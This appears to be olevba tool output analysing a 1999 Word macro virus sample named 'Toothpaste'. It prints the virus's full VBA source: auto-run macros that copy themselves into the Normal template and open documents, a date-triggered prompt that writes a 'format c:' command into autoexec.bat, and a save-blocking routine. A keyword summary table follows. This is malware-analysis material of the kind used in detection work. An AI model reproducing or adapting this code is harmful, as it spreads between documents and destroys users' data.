olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Toothpaste-fe64c03a775f7a419c5f1a11c0214987b4b870e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Toothpaste-fe64c03a775f7a419c5f1a11c0214987b4b870e9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toothpaste.frm 
in file: Virus.MSWord.Intended.Toothpaste-fe64c03a775f7a419c5f1a11c0214987b4b870e9 - OLE stream: 'Macros/VBA/Toothpaste'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Click()
MsgBox "If you don't want to be like everyone else just use AIM toothpaste", vbApplicationModal, "Toothpaste99 AIM"
q = MsgBox("Do you use AIM toothpsate?", vbYesNo, "Answer please!")
If q = vbYes Then
MsgBox "I like you man.I will not destroy your computer.", vbApplicationModal, "UIUPI"
ElseIf q = vbNo Then
MsgBox "You are dead man!I will terminate your computer.", vbApplicationModal, "Toothpaste99"
Open "C:\autoexec.bat" For Random As Paste
Print Paste; "Echo Termination Started"
Print Paste; "Format c: /q > NULL"
Print Paste; "Echo Termination Completed"
Tasks.ExitWindows
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Toothpaste99.bas 
in file: Virus.MSWord.Intended.Toothpaste-fe64c03a775f7a419c5f1a11c0214987b4b870e9 - OLE stream: 'Macros/VBA/Toothpaste99'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim inst(1) As Boolean
VBE.Activevbproject.VBComponents("Toothpaste99").Export "c:\data.mod"
VBE.Activevbproject.VBComponents("Toothpaste").Export "c:\data.frm"
For t = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(t).Name = "Toothpaste99" Or NormalTemplate.VBProject.VBComponents(t) = "Toothpaste" Then inst(0) = True
Next t
For t = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(t).Name = "Toothpaste99" Or ActiveDocument.VBProject.VBComponents(t) = "Toothpaste" Then inst(1) = True
Next t
If inst(0) = True And inst(1) = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\data.mod"
ActiveDocument.VBProject.VBComponents.Import "c:\data.frm"
ElseIf inst(0) = False And inst(1) = True Then
NormalTemplate.VBProject.VBComponents.Import "c:\data.mod"
NormalTemplate.VBProject.VBComponents.Import "c:\data.frm"
End If
If Day(Now) = 12 Then Toothpaste.Show
End Sub
'Aim wm97.toothpaste.b
'Word Version of Toothpaste AIM
Sub FileSave()
If Day(Now) = 14 Then
MsgBox "File can't be saved sorry.The toothpaste do not allow you to save documents."
ActiveDocument.Saved = True
ActiveDocument.Close False
Else
ActiveDocument.Save
End If

End Sub
'copyright yozak 99©.
'Powered by Bizarre VX Network.
Sub Autoexit()
Call AutoClose
MsgBox "Bye,bye,bye!!"
End Sub
'Don't forget to brush your teeth with AIM toothpaste
'Greece 99.
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

